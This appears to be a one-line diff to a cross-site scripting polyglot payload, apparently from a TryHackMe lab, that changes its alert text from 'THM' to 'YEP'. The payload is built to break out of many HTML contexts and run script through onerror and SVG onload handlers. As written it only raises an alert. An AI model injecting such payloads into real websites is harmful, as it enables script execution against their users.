@@ -1,1 +1,1 @@
-jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('YEP')//>\x3e
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('YEP') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('YEP')//>\x3e
